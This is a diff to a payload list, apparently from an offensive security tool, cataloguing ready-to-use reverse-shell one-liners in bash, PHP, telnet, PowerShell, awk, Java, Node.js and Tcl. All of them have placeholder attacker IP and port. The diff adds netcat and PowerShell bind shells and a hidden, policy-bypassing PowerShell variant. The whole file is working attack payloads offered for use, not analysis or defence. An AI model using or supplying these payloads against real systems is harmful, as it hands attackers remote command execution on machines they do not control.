@@ -1,3 +1,4 @@
+REVERSE SHELLS| 
 BASH REVERSE SHELL|bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1
 BASH REVERSE SHELL|0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196
 BASH REVERSE SHELL|exec 5<> /dev/tcp/[IPADDR]/[PORT]; cat <&5 | while read line; do $line 2>&5>&5; done
@@ -24,8 +25,13 @@ PHP REVERSE SHELL|php -r '$s=fsockopen("[IPADDR]",[PORT]);popen("/bin/sh -i <&3 
 TELNET REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && telnet [IPADDR] [PORT] 0/tmp/p
 TELNET REVERSE SHELL|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet [IPADDR] [PORT] > /tmp/f
 POWERSHELL REVERSE SHELL|powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-POWERSHELL REVERSE SHELL|powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IPADDR]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+POWERSHELL REVERSE SHELL|powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('[IPADDR]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 AWK REVERSE SHELL|awk 'BEGIN {s = "/inet/tcp/0/[IPADDR]/[PORT]"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 JAVA REVERSE SHELL|r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/[IPADDR]/[PORT];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();
 NODE.JS REVERSE SHELL|(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect([PORT],"[IPADDR]",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
 TCLSH REVERSE SHELL|echo 'set s [socket [IPADDR] [PORT]];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
+BIND SHELLS| 
+NETCAT BIND SHELL|nc -lnvp [PORT] -e /bin/bash
+NETCAT WINDOWS BIND SHELL|.\nc.exe -lnvp [PORT] -e c:\windows\system32\cmd.exe
+POWERSHELL BIND SHELL|powershell -NoP -NonI -W Hidden -Exec Bypass -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',[PORT]);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+
